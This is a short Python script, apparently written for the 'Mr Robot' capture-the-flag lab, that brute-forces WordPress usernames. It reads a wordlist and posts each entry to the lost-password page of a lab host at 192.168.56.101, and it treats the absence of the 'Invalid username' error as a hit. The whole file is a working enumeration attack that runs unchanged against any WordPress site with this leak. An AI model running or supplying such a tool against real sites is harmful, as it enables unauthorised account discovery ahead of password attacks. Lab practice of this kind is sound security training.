#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""

                      *                 ***
                     **                   ***
                     **                    **
                     **                    **
                     **                    **       ****
   ***       ****    **  ***      ***      **      * ***  * ***  ****
  * ***     * ***  * ** * ***    * ***     **     *   ****   **** **** *
 *   ***   *   ****  ***   ***  *   ***    **    **    **     **   ****
**    *** **         **     ** **    ***   **    **    **     **    **
********  **         **     ** ********    **    **    **     **    **
*******   **         **     ** *******     **    **    **     **    **
**        **         **     ** **          **    **    **     **    **
****    * ***     *  **     ** ****    *   **     ******      **    **
 *******   *******   **     **  *******    *** *   ****       ***   ***
  *****     *****     **    **   *****      ***                ***   ***
                            *
                           *
                          *
                         *
    Author:	@echel0n_1881

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Mr Robot wordpress username bruteforcer.
"""

import requests


error_string = "<strong>ERROR</strong>: Invalid username or e-mail.<br/>"
link = "http://192.168.56.101/wp-login.php?action=lostpassword"
dicio = open("fsocity.dic","r")
icerik = dicio.read()
icerik = icerik.split()


for username in icerik:
    payload = { 'user_login': username }
    r = requests.post(link,data=payload)
    print("[!] Trying the payload {} ".format(payload['user_login']))
    if error_string in r.text:
        pass
    else:
        print("[?] Username is found. {}".format(payload['user_login']))
        break
